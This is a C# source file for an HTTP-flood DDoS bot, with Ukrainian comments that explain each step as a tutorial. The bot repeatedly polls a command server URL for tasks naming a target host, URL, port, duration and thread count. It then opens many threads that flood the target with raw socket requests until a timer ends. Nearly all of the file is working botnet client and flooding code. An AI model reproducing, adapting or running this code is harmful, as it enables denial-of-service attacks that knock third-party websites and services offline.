using System;
using System.Threading;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.IO;

namespace HttpFlood
{
    class Program
    {   /*Перед методо Main пропиуємо змінні*/
        private static string Url = "http://www.yoursite.com"; //Response:host;url;prt;duration;threads;//Example:54.207.60.36;http://54.207.60.36;80;10;1000
        /*Змінна Url повинна мати посилання на сторінку, де будуть розміщуватися таски для ботів, 
        це може бути звичайний текстовий файл, без різниці. Приклад видачіт таску описаний в коментарі. 
        Нам потрібен метод, що відправляє Http-Get запит.*/
        static void Main(string[] args)
        {
            while(true)
            {
                String[] response = Get(Url).Split(';');
                try
                {
                    Ddos Task = new Ddos(response[0], response[1], Int32.Parse(response[2]));
                    Task.HttpFlood(Int32.Parse(response[3]), Int32.Parse(response[4]));
                }
                catch (Exception e)
                {
                    Thread.Sleep(3000);
                }
            }
        }

        private static String Get(string Link)
        {
            WebRequest request = WebRequest.Create(Link);
            request.Credentials = CredentialCache.DefaultCredentials;
            ((HttpWebRequest)request).UserAgent = "1M50RRY";
            WebResponse response = request.GetResponse();
            Stream dataStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(dataStream);

            return reader.ReadToEnd();
        }
    }
    /*Будемо реалізовувати Http-flood на самому простому прикладі. Створимо клас Ddos і одразу прописуємо 
    потрібні нам змінніі конструктор*/
    class Ddos
    {
        private string HostName; // 127.0.0.1
        private string Url; // http://127.0.0.1/index.php?god=ims0rry
        private int Port; // 80
        private bool Toggle = false; // Timer

        public Ddos(string Host, string Url, int Port)
        {
            this.HostName = Host;
            this.Url = Url;
            this.Port = Port;
        }
        /*Для відрахунку часу будуємо простенький таймер*/
        private void Timer(int minutes)
        {
            for (int i = 0; i < minutes*60; i++)
            {
                Thread.Sleep(1000);
            }
        }
        /*Далі розбираємось з самою вдправкою запиту до серверу. Використовуємо сокети (System.Net.Sockets)*/
        private void SendData()
        {
            IPAddress Host = IPAddress.Parse(HostName);
            IPEndPoint Hostep = new IPEndPoint(Host, Port);
            while(Toggle)
            {
                try
                {
                    Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sock.Connect(Hostep);
                    sock.Send(Encoding.UTF8.GetBytes(Url));
                    sock.Send(Encoding.UTF8.GetBytes("\r\n"));
                    sock.Close();
                }
                catch(Exception e)
                {
                    new Thread(SendData).Start();
                }
            }
        }
        /*Тепер під цей метод створимо обгортку, яка буде запускати потоки і таймер*/
        public void HttpFlood(int duration, int threads)
        {
            Toggle = true;
            while (threads > 0)
            {
                new Thread(SendData).Start();
                threads--;
            }
            new Thread(() => Timer(duration)).Start();
        }

    }
}
